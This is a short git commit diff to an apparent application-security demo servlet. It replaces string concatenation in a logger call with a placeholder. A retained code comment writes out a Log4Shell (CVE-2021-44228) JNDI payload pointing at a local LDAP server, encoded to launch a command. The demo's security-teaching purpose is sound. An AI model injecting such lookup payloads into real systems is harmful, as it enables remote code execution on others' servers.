5eb89f1adf3350c4facaa0d3ea6480649c9115cc
zhukov_an <alexey.n.zhukov@gmail.com>
2025-09-11 12:45:57 +0300

    String concatenation replaced with placeholder

--- src/main/java/local/ptdemo/appsec/poc/servlet/simple/Servlet.java
+++ src/main/java/local/ptdemo/appsec/poc/servlet/simple/Servlet.java
@@ -26,7 +26,7 @@ public class Servlet extends HttpServlet {
         else {
             // CVE-2021-44228 (RCE) may be exploited using
             // cmd that equals ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2FsYy5leGU=}
-            logger.error("Unsupported command: " + cmd);
+            logger.error("Unsupported command: {}", cmd);
         }
     }
 }
